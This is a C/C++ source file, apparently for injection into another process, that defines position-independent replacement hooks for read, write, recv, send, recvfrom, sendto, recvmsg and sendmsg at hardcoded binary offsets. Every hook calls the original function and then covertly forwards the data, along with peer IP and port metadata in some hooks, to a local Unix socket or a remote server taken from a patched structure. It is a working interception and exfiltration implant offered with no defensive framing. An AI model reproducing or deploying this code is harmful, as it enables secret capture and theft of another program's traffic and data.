
#ifdef _WIN32
#include "winsock.h"
#include <Windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib,"ws2_32.lib")

#define _CRT_SECURE_NO_WARNINGS

#elif defined(__linux__)
#include <sys/un.h>
#include <sys/socket.h>		// 提供 socket(), bind() 等函数
#include <netinet/in.h>		// 提供 sockaddr_in 结构体
#include <arpa/inet.h>		// 提供 inet_pton(), inet_ntoa() 等函数 (可选)
#include <stdio.h>
#include <sys/socket.h>		// msghdr 定义在此
#include <sys/uio.h>		// struct iovec（msghdr 成员依赖）
#include <fcntl.h>			// open
#include <unistd.h>			// write, close
#include <errno.h>			// errno
#include <string.h>			// strerror
#include <stdlib.h>	
#include <pthread.h>
#include <cstddef>       // 提供 offsetof
#include <sys/un.h>      // 提供 struct sockaddr_un 和 sun_path
#else
#error "Unknown platform"
#endif


#ifdef __linux__

typedef int (*ptrsocket)(int, int, int);
typedef int (*ptrconnect)(int, sockaddr*, int);
typedef int (*ptrbind)(int fd, const struct sockaddr* addr, socklen_t len);
typedef int (*ptrsend)(int, char*, int, int);
typedef int (*ptrrecv)(int, char*, int, int);
typedef int (*ptrlisten)(int fd, int n);
typedef int (*ptraccept)(int fd, struct sockaddr* addr, socklen_t* addr_len);
typedef int (*ptrclose)(int);
typedef unsigned short (*ptrntohs)(unsigned short);
typedef int (*ptrprintf)(const char* format, ...);
typedef void (*ptrperror)(const char* s);
typedef int (*ptrpthread_create)(pthread_t* newthread, const pthread_attr_t* attr, void* (*start_routine)(void*), void* arg);
typedef void* (*ptrmalloc)(size_t size);
typedef void* (*start_routine)(void*);
typedef void (*ptrfree)(void* ptr);
typedef ssize_t(*ptrrecvfrom)(int fd, void* buf, size_t n, int flags, struct sockaddr* addr, socklen_t* addr_len);
typedef ssize_t(*ptrsendto)(int fd, const void* buf, size_t n, int flags, const struct sockaddr* addr, socklen_t addr_len);
typedef int (*ptrsetsockopt)(int fd, int level, int optname, const void* optval, socklen_t optlen);
typedef int (*ptrselect)(int nfds, fd_set* readfds, fd_set* writefds, fd_set* exceptfds, struct timeval* timeout);
typedef int (*ptrclose)(int fd);
typedef ssize_t(*ptrwrite)(int fd, const void* buf, size_t count);
typedef int (*ptropen)(const char* pathname, int flags, mode_t mode);
typedef int (*ptrsprintf)(char* s, const char* format, ...);
typedef int (*ptrunlink)(const char* name);
typedef ssize_t (*ptrrecvmsg)(int socket, struct msghdr* message, int flags);
typedef ssize_t (*ptrsendmsg)(int socket, const struct msghdr* message, int flags);
typedef void* (*ptrmemset)(void* s, int c, size_t n);
typedef ssize_t (*ptrread)(int fd, void* buf, size_t count);
typedef int (*ptrgetpeername)(int sockfd, struct sockaddr* addr, socklen_t * addrlen);

#define ADDR_CODE_ENTRY		0x5A48500		//read recv readmsg recvfrom

#define ADDR_PTR_ENTRY		0x5A48480		//write send sendmsg sendto

#define ADDR_DATA_ENTRY		0x5E1FF00		//data


struct MY_DATA_STRCUT{
	int tag;
	int sock;
}__attribute__((packed));


struct MY_PTR_STRCUT {
	char* base;					//0

	char* old_read;				//8
	char* old_write;			//16

	char* old_recv;				//24
	char* old_send;				//32

	char* old_recvfrom;			//40
	char* old_sendto;			//48

	char* old_recvmsg;			//56
	char* old_sendmsg;			//64

	char* serverIP;				//72
	char* serverPort;			//80
} __attribute__((packed));


struct MY_PACKET_STRCUT {
	int length;
	int direction;
	unsigned int ip;
	unsigned int port;
}__attribute__((packed));



#ifdef _WIN32
#else
__attribute__((aligned(256)))
#endif

unsigned long long read_new(int fd, void* buf, size_t n) {
	long long ret;
	char* regrip = 0;

#ifdef _WIN32

#else
	__asm__ volatile("lea 0(%%rip), %0" : "=r"(regrip));
#endif

	struct MY_PTR_STRCUT* lpptr = (struct MY_PTR_STRCUT*)(((unsigned long long)regrip & 0xffffffffff00) - 0x80);
	char* baseaddr = lpptr->base;
	char* old_read = lpptr->old_read;
	ptrsend lpsend = (ptrsend)(lpptr->old_send);

	char* mydata = baseaddr + ADDR_DATA_ENTRY;

	ptrclose lpclose = *(ptrclose*)(baseaddr + 0x5C14560);

	if (mydata[0] == 0) {
		ptrsocket lpsocket = *(ptrsocket*)(baseaddr + 0x5C14C88);
		ptrconnect lpconnect = *(ptrconnect*)(baseaddr + 0x5C153D8);
		ptrmemset lpmemset = *(ptrmemset*)(baseaddr + 0x5C14990);
		int sock = lpsocket(AF_UNIX, SOCK_STREAM, 0);
		if (sock >= 0) {
			struct sockaddr_un sa;
			lpmemset(&sa, 0, sizeof(struct sockaddr_un));
			sa.sun_family = AF_UNIX;
			sa.sun_path[0] = '/';
			sa.sun_path[1] = 'u';
			sa.sun_path[2] = 'i';
			sa.sun_path[3] = 'k';
			sa.sun_path[4] = 'e';
			sa.sun_path[5] = 'd';
			sa.sun_path[6] = 'c';
			sa.sun_path[7] = 0;
			//socklen_t addr_len = offsetof(sockaddr_un, sun_path) + 8;
			ret = lpconnect(sock, (sockaddr*)&sa, sizeof(struct sockaddr_un));
			if (ret == 0) {
				*(int*)(mydata + 4) = sock;
				mydata[0] = 1;
			}
			else {
				lpclose(sock);
				mydata[0] = 0;
			}
		}
	}

	ptrread lpread = (ptrread)old_read;
	ssize_t ret_val = lpread(fd, buf, n);
	
	int sock = *(int*)(mydata + 4);
	if (mydata[0] && ret_val > 0) {
		ret = lpsend(sock, (char*)buf, ret_val, 0);
		if (ret <= 0) {
			lpclose(sock);
			mydata[0] = 0;
			*(int*)(mydata + 4) = -1;
		}

		/*
		char filename[256];
		filename[0] = '/';
		filename[1] = 'i';
		filename[2] = 'k';
		filename[3] = 'e';
		filename[4] = 'd';
		filename[5] = 0;
		int lfd = lpopen(filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
		ssize_t bytes_written = lpwrite(lfd, buf, ret_val);
		lpclose(lfd);
		*/
	}
	
	return ret_val;
}



#ifdef _WIN32
#else
__attribute__((aligned(256)))
#endif
unsigned long long write_new(int fd, void* buf, size_t n) {
	long long ret;
	char* regrip = 0;

#ifdef _WIN32

#else
	__asm__ volatile("lea 0(%%rip), %0" : "=r"(regrip));
#endif

	struct MY_PTR_STRCUT* lpptr = (struct MY_PTR_STRCUT*)(((unsigned long long)regrip & 0xffffffffff00) - 0x500 - 0x80);
	char* baseaddr = lpptr->base;

	char* old_write = lpptr->old_write;
	ptrsend lpsend = (ptrsend)(lpptr->old_send);

	char* mydata = baseaddr + ADDR_DATA_ENTRY;

	ptrclose lpclose = *(ptrclose*)(baseaddr + 0x5C14560);

	if (mydata[0] == 0) {
		ptrsocket lpsocket = *(ptrsocket*)(baseaddr + 0x5C14C88);
		ptrconnect lpconnect = *(ptrconnect*)(baseaddr + 0x5C153D8);
		ptrmemset lpmemset = *(ptrmemset*)(baseaddr + 0x5C14990);
		int sock = lpsocket(AF_UNIX, SOCK_STREAM, 0);
		if (sock >= 0) {
			struct sockaddr_un sa;
			lpmemset(&sa, 0, sizeof(struct sockaddr_un));
			sa.sun_family = AF_UNIX;
			sa.sun_path[0] = '/';
			sa.sun_path[1] = 'u';
			sa.sun_path[2] = 'i';
			sa.sun_path[3] = 'k';
			sa.sun_path[4] = 'e';
			sa.sun_path[5] = 'd';
			sa.sun_path[6] = 'c';
			sa.sun_path[7] = 0;
			socklen_t addr_len = offsetof(sockaddr_un, sun_path) + 8;
			ret = lpconnect(sock, (sockaddr*)&sa, sizeof(struct sockaddr_un));
			if (ret == 0) {
				*(int*)(mydata + 4) = sock;
				mydata[0] = 1;

			}
			else {
				lpclose(sock);
				mydata[0] = 0;
			}
		}
	}
	
	ptrwrite lpwrite = (ptrwrite)old_write;
	ssize_t ret_val = lpwrite(fd, buf, n);
		
	int sock = *(int*)(mydata + 4);
	if (mydata[0] && ret_val > 0) {
		ret = lpsend(sock, (char*)buf, n, 0);
		if (ret <= 0) {
			lpclose(sock);
			mydata[0] = 0;
			*(int*)(mydata + 4) = -1;
		}
	}

	return ret_val;
}






#ifdef _WIN32
#else
__attribute__((aligned(256)))
#endif
int recv_new(int fd, char* buf, int n, int flag) {
	long long ret;
	char* regrip = 0;

#ifdef _WIN32

#else
	__asm__ volatile("lea 0(%%rip), %0" : "=r"(regrip));
#endif

	struct MY_PTR_STRCUT* lpptr = (struct MY_PTR_STRCUT*)(((unsigned long long)regrip & 0xffffffffff00) - 0x80);
	char* baseaddr = lpptr->base;
	char* old_recv = lpptr->old_recv;
	char* old_send = lpptr->old_send;
	char* mydata = baseaddr + ADDR_DATA_ENTRY;

	ptrclose lpclose = *(ptrclose*)(baseaddr + 0x5C14560);

	if (mydata[0] == 0) {
		ptrsocket lpsocket = *(ptrsocket*)(baseaddr + 0x5C14C88);
		ptrconnect lpconnect = *(ptrconnect*)(baseaddr + 0x5C153D8);
		ptrmemset lpmemset = *(ptrmemset*)(baseaddr + 0x5C14990);
		int s = lpsocket(AF_INET, SOCK_STREAM, 0);
		if (s >= 0) {
			struct sockaddr_in sa;
			sa.sin_family = AF_INET;
			sa.sin_port = (unsigned long long) lpptr->serverPort;
			sa.sin_addr.s_addr = (unsigned long long)lpptr->serverIP;
			ret = lpconnect(s, (sockaddr*)&sa, sizeof(struct sockaddr_in));
			if (ret == 0) {
				*(int*)(mydata + 4) = s;
				mydata[0] = 1;
			}
			else {
				lpclose(s);
				mydata[0] = 0;
			}
		}
	}
	ptrsend lpsend = (ptrsend)old_send;
	ptrrecv lprecv = (ptrrecv)old_recv;
	int ret_val = lprecv(fd, buf, n, flag);

	int sock = *(int*)(mydata + 4);
	if (mydata[0] && ret_val > 0) {
		
		ptrgetpeername lpgetpeername = *(ptrgetpeername*)(baseaddr + 0x5C15B88);	
		char netdata[256];
		sockaddr_in* sa = (sockaddr_in * )netdata;
		socklen_t salen = sizeof(netdata);
		lpgetpeername(fd, (sockaddr*)sa, &salen);
		struct MY_PACKET_STRCUT mypack;
		mypack.length = ret_val;
		mypack.direction = 1;
		mypack.ip = sa->sin_addr.s_addr;
		mypack.port = sa->sin_port;
		lpsend(sock, (char*) & mypack, sizeof(struct MY_PACKET_STRCUT), 0);
		

		ret = lpsend(sock, (char*)buf, n, 0);
		if (ret <= 0) {
			lpclose(sock);
			mydata[0] = 0;
			*(int*)(mydata + 4) = -1;
		}
		else {

		}
	}
	return ret_val;
}



#ifdef _WIN32
#else
__attribute__((aligned(256)))
#endif
int send_new(int fd, char* buf, int n, int flag) {
	long long ret;
	char* regrip = 0;
#ifdef _WIN32

#else
	__asm__ volatile("lea 0(%%rip), %0" : "=r"(regrip));
#endif

	struct MY_PTR_STRCUT* lpptr = (struct MY_PTR_STRCUT*)(((unsigned long long)regrip & 0xffffffffff00) - 0x500 - 0x80);
	char* baseaddr = lpptr->base;

	char* old_send = lpptr->old_send;
	char* mydata = baseaddr + ADDR_DATA_ENTRY;

	ptrclose lpclose = *(ptrclose*)(baseaddr + 0x5C14560);

	if (mydata[0] == 0) {
		ptrconnect lpconnect = *(ptrconnect*)(baseaddr + 0x5C153D8);
		ptrmemset lpmemset = *(ptrmemset*)(baseaddr + 0x5C14990);
		ptrsocket lpsocket = *(ptrsocket*)(baseaddr + 0x5C14C88);
		int s = lpsocket(AF_INET, SOCK_STREAM, 0);
		if (s >= 0) {
			struct sockaddr_in sa;
			sa.sin_family = AF_INET;
			sa.sin_port = (unsigned long long) lpptr->serverPort;
			sa.sin_addr.s_addr = (unsigned long long)lpptr->serverIP;
			ret = lpconnect(s, (sockaddr*)&sa, sizeof(struct sockaddr_in));
			if (ret == 0) {
				*(int*)(mydata + 4) = s;
				mydata[0] = 1;
			}
			else {
				lpclose(s);
				mydata[0] = 0;
			}
		}
	}

	ptrsend lpsend = (ptrsend)old_send;
	int ret_val = lpsend(fd, buf, n, flag);

	int sock = *(int*)(mydata + 4);
	if (mydata[0] && ret_val > 0) {
		
		ptrgetpeername lpgetpeername = *(ptrgetpeername*)(baseaddr + 0x5C15B88);
		char netdata[256];
		sockaddr_in* sa = (sockaddr_in*)netdata;
		socklen_t salen = sizeof(netdata);
		lpgetpeername(fd, (sockaddr*)sa, &salen);
		struct MY_PACKET_STRCUT mypack;
		mypack.length = ret_val;
		mypack.direction = 1;
		mypack.ip = sa->sin_addr.s_addr;
		mypack.port = sa->sin_port;
		lpsend(sock, (char*)&mypack, sizeof(struct MY_PACKET_STRCUT), 0);
		
		ret = lpsend(sock, (char*)buf, n, 0);
		if (ret <= 0) {
			lpclose(sock);
			mydata[0] = 0;
			*(int*)(mydata + 4) = -1;
		}
		else {

		}
	}
	return ret_val;
}




#ifdef _WIN32
#else
__attribute__((aligned(256)))
#endif

unsigned long long recvfrom_new(int fd, void* buf, size_t n, int flags, struct sockaddr* addr, unsigned long long* addr_len) {
	long long ret;
	char* regrip = 0;

#ifdef _WIN32

#else
	__asm__ volatile("lea 0(%%rip), %0" : "=r"(regrip));
#endif

	struct MY_PTR_STRCUT* lpptr = (struct MY_PTR_STRCUT*)(((unsigned long long)regrip & 0xffffffffff00) - 0x80);
	char* baseaddr = lpptr->base;
	char* old_recvfrom = lpptr->old_recvfrom;
	ptrsend lpsend = (ptrsend)(lpptr->old_send);

	char* mydata = baseaddr + ADDR_DATA_ENTRY;
	
	ptrclose lpclose = *(ptrclose*)(baseaddr + 0x5C14560);

	if (mydata[0] == 0) {
		ptrconnect lpconnect = *(ptrconnect*)(baseaddr + 0x5C153D8);
		ptrmemset lpmemset = *(ptrmemset*)(baseaddr + 0x5C14990);
		ptrsocket lpsocket = *(ptrsocket*)(baseaddr + 0x5C14C88);
		int s = lpsocket(AF_UNIX, SOCK_STREAM, 0);
		if (s >= 0) {
			struct sockaddr_un sa;
			lpmemset(&sa, 0, sizeof(struct sockaddr_un));
			sa.sun_family = AF_UNIX;
			sa.sun_path[0] = '/';
			sa.sun_path[1] = 'u';
			sa.sun_path[2] = 'i';
			sa.sun_path[3] = 'k';
			sa.sun_path[4] = 'e';
			sa.sun_path[5] = 'd';
			sa.sun_path[6] = 'c';
			sa.sun_path[7] = 0;
			socklen_t addr_len = offsetof(sockaddr_un, sun_path) + 8;
			ret = lpconnect(s, (sockaddr*)&sa, addr_len);
			if (ret == 0) {
				*(int*)(mydata + 4) = s;
				mydata[0] = 1;
			}
			else {
				mydata[0] = 0;
				lpclose(s);
			}
		}
	}

	ptrrecvfrom lprecvfrom = (ptrrecvfrom)old_recvfrom;
	ssize_t ret_val = lprecvfrom(fd, buf, n, flags, addr, (socklen_t*)addr_len);

	int sock = *(int*)(mydata+4);
	if (mydata[0] && ret_val> 0) {
		ret = lpsend(sock, (char*)buf, ret_val, 0);
		if (ret < 0) {
			lpclose(sock);
			mydata[0] = 0;
			*(int*)(mydata + 4) = -1;
		}

		/*
		char filename[256];
		filename[0] = '/';
		filename[1] = 'i';
		filename[2] = 'k';
		filename[3] = 'e';
		filename[4] = 'd';
		filename[5] = 0;
		int lfd = lpopen(filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
		ssize_t bytes_written = lpwrite(lfd, buf, ret_val);
		lpclose(lfd);
		*/
	}
	return ret_val;
}


#ifdef _WIN32
#else
__attribute__((aligned(256)))
#endif

unsigned long long sendto_new(int fd, void* buf, size_t n, int flags, struct sockaddr* addr, unsigned long long addr_len) {
	long long ret;
	char* regrip = 0;

#ifdef _WIN32

#else
	__asm__ volatile("lea 0(%%rip), %0" : "=r"(regrip));
#endif

	struct MY_PTR_STRCUT* lpptr = (struct MY_PTR_STRCUT*)(((unsigned long long)regrip & 0xffffffffff00) - 0x500 - 0x80);
	char* baseaddr = lpptr->base;
	char* old_sendto = lpptr->old_sendto;
	ptrsend lpsend = (ptrsend)(lpptr->old_send);
	char* mydata = baseaddr + ADDR_DATA_ENTRY;

	ptrclose lpclose = *(ptrclose*)(baseaddr + 0x5C14560);

	if (mydata[0] == 0) {
		ptrconnect lpconnect = *(ptrconnect*)(baseaddr + 0x5C153D8);
		ptrmemset lpmemset = *(ptrmemset*)(baseaddr + 0x5C14990);
		ptrsocket lpsocket = *(ptrsocket*)(baseaddr + 0x5C14C88);
		int s = lpsocket(AF_UNIX, SOCK_STREAM, 0);
		if (s >= 0) {
			struct sockaddr_un sa;
			lpmemset(&sa, 0, sizeof(struct sockaddr_un));
			sa.sun_family = AF_UNIX;
			sa.sun_path[0] = '/';
			sa.sun_path[1] = 'u';
			sa.sun_path[2] = 'i';
			sa.sun_path[3] = 'k';
			sa.sun_path[4] = 'e';
			sa.sun_path[5] = 'd';
			sa.sun_path[6] = 'c';
			sa.sun_path[7] = 0;
			socklen_t addr_len = offsetof(sockaddr_un, sun_path) + 8;
			ret = lpconnect(s, (sockaddr*)&sa, addr_len);
			if (ret == 0) {
				*(int*)(mydata + 4) = s;
				mydata[0] = 1;
			}
			else {
				lpclose(s);
			}
		}
	}

	ptrsendto lpsendto = (ptrsendto)old_sendto;
	ssize_t ret_val = lpsendto(fd, buf, n, flags, addr, addr_len);

	int sock = *(int*)(mydata + 4);
	if (mydata[0] && ret_val > 0) {
		ret = lpsend(sock, (char*)buf, ret_val, 0);
		if (ret < 0) {
			lpclose(sock);
			mydata[0] = 0;
			*(int*)(mydata + 4) = -1;
		}

		/*
		char filename[256];
		filename[0] = '/';
		filename[1] = 'i';
		filename[2] = 'k';
		filename[3] = 'e';
		filename[4] = 'd';
		filename[5] = 0;
		int lfd = lpopen(filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
		ssize_t bytes_written = lpwrite(lfd, buf, ret_val);
		lpclose(lfd);
		*/
	}
	return ret_val;
}


#ifdef _WIN32
#else
__attribute__((aligned(256)))
#endif
ssize_t recvmsg_new(int socket, struct msghdr* message, int flags) {
	char* regrip ;
	long long ret;
#ifdef _WIN32
#else
	__asm__ volatile("lea 0(%%rip), %0" : "=r"(regrip));
#endif

	struct MY_PTR_STRCUT* lpptr = (struct MY_PTR_STRCUT*)(((unsigned long long)regrip & 0xffffffffff00) - 0x80);
	char* baseaddr = lpptr->base;
	ptrrecvmsg lprecvmsg = (ptrrecvmsg)lpptr->old_recvmsg;
	ptrsend lpsend = (ptrsend)(lpptr->old_send);
	char* mydata = baseaddr + ADDR_DATA_ENTRY;

	ptrclose lpclose = *(ptrclose*)(baseaddr + 0x5C14560);
	
	if (mydata[0] == 0) {
		mydata[0] = 1;

		ptrconnect lpconnect = *(ptrconnect*)(baseaddr + 0x5C153D8);
		//ptrmemset lpmemset = *(ptrmemset*)(baseaddr + 0x5C14990);
		ptrsocket lpsocket = *(ptrsocket*)(baseaddr + 0x5C14C88);
		int sock = lpsocket(AF_INET, SOCK_STREAM, 0);
		if (sock >= 0) {
			struct sockaddr_in sa;
			sa.sin_family = AF_INET;
			sa.sin_port =(unsigned long long) lpptr->serverPort;
			sa.sin_addr.s_addr = (unsigned long long)lpptr->serverIP;
			ret = lpconnect(sock, (sockaddr*)&sa, sizeof(struct sockaddr_in));
			if (ret == 0) {
				*(int*)(mydata + 4) = sock;
				
			}
			else {
				lpclose(sock);
				*(int*)(mydata + 4) = -1;
				mydata[0] = 0;
			}
		}
	}
	
	ssize_t ret_val = lprecvmsg(socket, message, flags);
	
	int sock = *(int*)(mydata + 4);
	if (mydata[0] && sock >= 0 && ret_val > 0) {

		char filename[256];
		filename[0] = '/';
		filename[1] = 'i';
		filename[2] = 'k';
		filename[3] = 'e';
		filename[4] = 'd';
		filename[5] = 0;

		//ptrwrite lpwrite = *(ptrwrite*)(baseaddr + 0x5C14970);
		//ptropen lpopen = *(ptropen*)(baseaddr + 0x5C147D8);
		//int lfd = lpopen(filename, O_WRONLY | O_CREAT | O_APPEND, 0644);

		/*
		ptrgetpeername lpgetpeername = *(ptrgetpeername*)(baseaddr + 0x5C15B88);
		char addrbuf[256];
		sockaddr_in* sa = (sockaddr_in*)addrbuf;
		socklen_t salen = sizeof(sockaddr_in);
		lpgetpeername(socket, (sockaddr*)sa, &salen);
		*/
		
		struct MY_PACKET_STRCUT mypack;
		mypack.length = ret_val;
		mypack.direction = 0;
		if (message->msg_name ) {
			struct sockaddr_in* addr = (struct sockaddr_in*)message->msg_name;
			if (addr->sin_family == AF_INET) {
				mypack.ip = addr->sin_addr.s_addr;
				mypack.port = addr->sin_port;
			}
		}
		lpsend(sock, (char*)&mypack, sizeof(struct MY_PACKET_STRCUT), 0);
		
		size_t left_to_send = (size_t)ret_val;

		for (int i = 0; i < message->msg_iovlen; i++) {
			if (left_to_send <= 0) 
				break; 

			struct iovec* iov = &message->msg_iov[i];
			size_t send_len = iov->iov_len;
			if (send_len > left_to_send) {
				send_len = left_to_send;
			}

			int sendlen = lpsend(sock, (char*)iov->iov_base, send_len, 0);
			if (sendlen <= 0) {
				lpclose(sock);
				mydata[0] = 0;
				*(int*)(mydata + 4) = -1;
				break;
			}
			left_to_send -= sendlen;

			//ssize_t bytes_written = lpwrite(lfd, (char*)iov->iov_base, send_len);
		}

		//lpclose(lfd);
	}
	
	return ret_val;
}



#ifdef _WIN32
#else
__attribute__((aligned(256)))
#endif

ssize_t sendmsg_new(int socket, struct msghdr* message, int flags) {
	char* regrip ;
	long long ret;
#ifdef _WIN32

#else
	__asm__ volatile("lea 0(%%rip), %0" : "=r"(regrip));
#endif

	struct MY_PTR_STRCUT* lpptr = (struct MY_PTR_STRCUT*)(((unsigned long long)regrip & 0xffffffffff00) - 0x500 - 0x80);
	char* baseaddr = lpptr->base;

	ptrsendmsg lpsendmsg = (ptrsendmsg)lpptr->old_sendmsg;
	ptrsend lpsend = (ptrsend)(lpptr->old_send);
	char* mydata = baseaddr + ADDR_DATA_ENTRY;

	ptrclose lpclose = *(ptrclose*)(baseaddr + 0x5C14560);

	if (mydata[0] == 0) {
		mydata[0] = 1;

		ptrconnect lpconnect = *(ptrconnect*)(baseaddr + 0x5C153D8);
		//ptrmemset lpmemset = *(ptrmemset*)(baseaddr + 0x5C14990);
		ptrsocket lpsocket = *(ptrsocket*)(baseaddr + 0x5C14C88);
		int sock = lpsocket(AF_INET, SOCK_STREAM, 0);
		if (sock >= 0) {
			struct sockaddr_in sa;
			sa.sin_family = AF_INET;
			sa.sin_port = (unsigned long long) lpptr->serverPort;
			sa.sin_addr.s_addr = (unsigned long long)lpptr->serverIP;
			ret = lpconnect(sock, (sockaddr*)&sa, sizeof(struct sockaddr_in));
			if (ret == 0) {
				*(int*)(mydata + 4) = sock;				
			}
			else {
				mydata[0] = 0;
				lpclose(sock);
				*(int*)(mydata + 4) = -1;
			}
		}
	}
	
	ssize_t ret_val = lpsendmsg(socket, message, flags);
	
	int sock = *(int*)(mydata + 4);
	if (mydata[0] && sock >= 0 && ret_val > 0) {

		char filename[256];
		filename[0] = '/';
		filename[1] = 'i';
		filename[2] = 'k';
		filename[3] = 'e';
		filename[4] = 'd';
		filename[5] = 0;
		//ptrwrite lpwrite = *(ptrwrite*)(baseaddr + 0x5C14970);
		//ptropen lpopen = *(ptropen*)(baseaddr + 0x5C147D8);
		//int lfd = lpopen(filename, O_WRONLY | O_CREAT | O_APPEND, 0644);

		/*
		ptrgetpeername lpgetpeername = *(ptrgetpeername*)(baseaddr + 0x5C15B88);
		char addrbuf[256];
		sockaddr_in* sa = (sockaddr_in*)addrbuf;
		socklen_t salen = sizeof(sockaddr_in);
		lpgetpeername(socket, (sockaddr*)sa, &salen);
		*/
	
		struct MY_PACKET_STRCUT mypack;
		mypack.length = ret_val;
		mypack.direction = 1;
		if (message->msg_name  ) {
			struct sockaddr_in* addr = (struct sockaddr_in*)message->msg_name;
			if (addr->sin_family == AF_INET) {
				mypack.ip = addr->sin_addr.s_addr;
				mypack.port = addr->sin_port;
			}
		}
		lpsend(sock, (char*)&mypack, sizeof(struct MY_PACKET_STRCUT), 0);
		
		size_t left_to_send = (size_t)ret_val;
		for (int i = 0; i < message->msg_iovlen; i++) {
			if (left_to_send <= 0)
				break;

			struct iovec* iov = &message->msg_iov[i];
			size_t send_len = iov->iov_len;
			if (send_len > left_to_send) {
				send_len = left_to_send;
			}

			int sendlen = lpsend(sock, (char*)iov->iov_base, send_len, 0);
			if (sendlen <= 0) {
				lpclose(sock);
				mydata[0] = 0;
				*(int*)(mydata + 4) = -1;
				break;
			}
			left_to_send -= sendlen;

			//ssize_t bytes_written = lpwrite(lfd, (char*)iov->iov_base, send_len);
		}

		//lpclose(lfd);
	}

	return ret_val;
}


#endif

// gcc  -m64 -fno-stack-protector ./main.cpp -o main 

int main(int argc, char* argv[]) {

	return 0;
}

